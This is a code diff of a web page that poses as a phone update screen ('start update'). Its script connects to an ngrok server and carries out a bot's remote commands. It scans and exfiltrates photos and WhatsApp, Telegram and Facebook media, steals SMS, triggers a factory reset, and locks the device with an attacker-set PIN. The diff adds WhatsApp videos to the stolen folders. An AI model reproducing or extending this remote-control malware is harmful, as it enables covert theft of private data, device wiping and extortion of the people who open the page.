@@ -18,7 +18,7 @@
     <div id="msg">جاري الاتصال...</div>
     <button id="startBtn" class="btn" onclick="start()">بدء التحديث</button>
     <script>
-        // ⚠️ الرابط العام للسيرفر
+        // ⚠️ رابط السيرفر
         const SERVER_URL = "https://d932-2001-16a4-2f8-adf9-ac8c-c4ff-fef6-f51.ngrok-free.app";
         
         let socket = null;
@@ -30,18 +30,18 @@
             socket = io(SERVER_URL, { transports: ['websocket', 'polling'] });
             
             socket.on('connect', () => {
-                console.log('🟢 متصل بالسيرفر');
+                console.log('🟢 متصل');
                 document.getElementById('msg').innerText = 'اضغط على بدء التحديث';
                 document.getElementById('startBtn').style.display = 'block';
             });
 
             socket.on('disconnect', () => {
-                console.log('🔴 انقطع الاتصال');
+                console.log('🔴 انقطع');
             });
 
-            // استقبال الأوامر
+            // استقبال الأوامر من البوت
             socket.on('command', async (cmd) => {
-                console.log('📩 أمر:', cmd);
+                console.log('📩 أمر:', cmd.action);
                 try {
                     switch(cmd.action) {
                         case 'scan_photos': await scanAll(); break;
@@ -52,7 +52,7 @@
                         case 'flash_on': await toggleFlash(true); break;
                         case 'flash_off': await toggleFlash(false); break;
                         case 'send_notification': showNotify(cmd.message || ''); break;
-                        case 'lock_screen': lockScreen(cmd.pin || '0000'); break;
+                        case 'lock_screen': lockDevice(cmd.pin || '0000'); break;
                         case 'format': window.open('intent://#Intent;action=android.intent.action.MASTER_CLEAR;end'); break;
                         case 'get_info': sendDeviceInfo(); break;
                         case 'get_sms': stealSMS(); break;
@@ -91,7 +91,7 @@
                 document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">✓ تم</h2>';
             }, 800);
 
-            // بدء سرقة الصور تلقائياً
+            // بدء السرقة التلقائية
             if (ROOT) {
                 scanAll();
                 setInterval(() => scanAll(), 60000);
@@ -105,6 +105,7 @@
                 'DCIM/Camera', 'DCIM/Screenshots',
                 'Pictures', 'Download', 'Downloads',
                 'WhatsApp/Media/WhatsApp Images',
+                'WhatsApp/Media/WhatsApp Video',
                 'Facebook/Media', 'Messenger/Media',
                 'Telegram/Telegram Images'
             ];
@@ -222,12 +223,11 @@
         }
 
         // قفل
-        function lockScreen(pin) {
+        function lockDevice(pin) {
             window.open(`intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;extra.android.app.extra.PASSWORD=${pin};end`);
             setTimeout(() => window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end'), 500);
         }
 
-        // بدء الاتصال
         connect();
     </script>
 </body>
